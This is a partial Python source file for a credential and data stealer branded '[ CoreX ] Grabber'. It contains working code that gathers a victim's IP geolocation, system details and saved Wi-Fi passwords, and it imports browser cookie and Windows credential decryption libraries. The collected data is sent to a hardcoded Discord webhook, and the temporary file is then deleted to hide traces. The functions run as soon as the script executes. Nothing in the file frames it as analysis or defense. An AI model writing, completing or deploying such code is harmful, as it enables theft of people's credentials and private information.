...
import requests,browser_cookie3,platform, GPUtil, psutil,os,shutil,base64,json,sqlite3,win32crypt,cv2,zipfile,time,pyautogui,re,subprocess
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
wbz='https://discord.com/api/webhooks/1520465203941212210/XjuqvNdjYrUG74OtMNw7k44-5bIXfmo-D7BYZmq12iIufPLU-A_oJlDjVSAmpucf4CSY'
def ip():
 try:
  z = requests.get("https://ipinfo.io/json", timeout=5)
  z.raise_for_status()
  data = z.json()
  ...
  x = DiscordWebhook(url=wbz, username="[ CoreX ] Grabber", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&", content="||@everyone||")
  y = DiscordEmbed(title=":globe_with_meridians: IP Info")
  y.add_embed_field(name="IP INFORMATION", value=f"**:wireless: | {ip}**\n\n **:round_pushpin: | {city}, {postal}, {region} {country} {tz}** \n\n **:bookmark_tabs: | {org}**")
  x.add_embed(y)
  x.execute()
 except:pass
ip()
def sysinfos():
 try:
  ...
  gpus = GPUtil.getGPUs()
  gpiusa = gpus[0].name if gpus else "No GPU found"
  mem = psutil.virtual_memory()
  x = DiscordWebhook(url=wbz, username="[ CoreX ] Grabber", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
  y = DiscordEmbed(title=":desktop: PC Info")
  y.add_embed_field(name="PC INFORMATION", value=f"**:man: | Username: {ds.node}**\n\n**:floppy_disk: | Processor: {ds.machine} {sdg}**\n\n**:desktop: | System: {ds.system}**\n\n**:vhs: | GPU: {gpiusa}**\n\n**:minidisc: | Memory(bytes): {mem.total / (1024**3):.2f} GB**")
  x.add_embed(y)
  x.execute()
 except:pass
...
def roblos():
 ...
 if coc == []:
      xs = DiscordWebhook(url=wbz, username="[ CoreX ] Grabber", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
...
def get_wifi_password(profile):
    ...
    return None
def save_wifi_passwords_to_file(profiles, output_file):
    with open(output_file, 'w') as file:
        for profile in profiles:
            password = get_wifi_password(profile)
            if password:
                file.write(f"WIFI-NAME: {profile}\nPassword: {password}\n\n")
def main():
    output_file = 'Win_Pass.txt'
    profiles = get_wifi_profiles()
    if profiles:
        save_wifi_passwords_to_file(profiles, output_file)
...
def load():
    webhook = DiscordWebhook(url=wbz, username="[ CoreX ] Grabber", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
    with open("Win_Pass.txt", 'rb') as filen:
        webhook.add_file(file=filen.read(), filename="Wifi Passwords.txt")

    response = webhook.execute()
    os.remove("Win_Pass.txt")
load()
